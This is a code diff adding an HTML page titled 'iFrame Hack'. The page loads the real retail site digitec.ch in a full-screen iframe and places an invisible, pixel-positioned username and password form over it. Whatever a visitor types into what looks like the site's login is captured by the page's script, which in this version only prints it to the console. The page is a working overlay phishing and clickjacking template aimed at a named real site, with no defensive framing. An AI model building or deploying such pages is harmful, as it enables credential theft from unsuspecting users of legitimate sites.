@@ -1,0 +1,67 @@
+<!doctype html>
+<html class="no-js" lang="">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="x-ua-compatible" content="ie=edge">
+        <title>iFrame Hack</title>
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+    </head>
+
+    <body style="margin:0px; padding:0px; overflow:hidden; height:auto">                    
+              
+        <iframe id="hack" src="http://www.digitec.ch" frameborder="0" style="width:100%"></iframe>
+            
+        <script>
+
+            document.getElementById("hack").height = screen.height;
+
+            var form = document.createElement("form"); //form created
+            form.setAttribute('id',"myform");
+            form.setAttribute('method',"post");
+            form.setAttribute('action',"");
+            form.setAttribute('style',"position:absolute; right:197px; top:210px; border:1px solid transparent; width:267px; background-color:transparent;");
+
+            var inputUser = document.createElement("input"); //input element, text
+            inputUser.setAttribute('id',"username");
+            inputUser.setAttribute('type',"text");
+            inputUser.setAttribute('name',"username");
+            inputUser.setAttribute('style',"width:253px; padding:6px; border:1px solid transparent;");
+            
+            var inputPass = document.createElement("input"); //input element, password
+            inputPass.setAttribute('id',"password");
+            inputPass.setAttribute('type',"password");
+            inputPass.setAttribute('name',"password");
+            inputPass.setAttribute('style',"margin-top:42px; width:251px; padding:7px; border:1px solid transparent; background-color:transparent;");
+
+
+            var buttonSubmit = document.createElement("button"); //button element, Submit button
+            buttonSubmit.setAttribute('type',"submit");
+            buttonSubmit.setAttribute('name',"submit");
+            buttonSubmit.setAttribute('style',"margin-top:170px; padding:17px; width:67px; background-color:transparent; border:1px solid transparent;");
+            
+            //containerDiv.appendChild(form);
+            form.appendChild(inputUser);
+            form.appendChild(document.createElement("br"));
+            form.appendChild(inputPass);
+            form.appendChild(document.createElement("br"));
+            form.appendChild(buttonSubmit);
+            
+            document.getElementsByTagName('body')[0].appendChild(form);
+
+            form.addEventListener("submit", function(e){
+                e.preventDefault();
+                e.stopPropagation();
+
+                if(e.target && e.target.id == 'myform'){
+                    var username = document.getElementById("username").value;
+                    var password = document.getElementById("password").value;
+
+                    console.log(username + "\n" + password);
+                }
+            })
+            
+        </script>
+
+    </body>        
+</html>
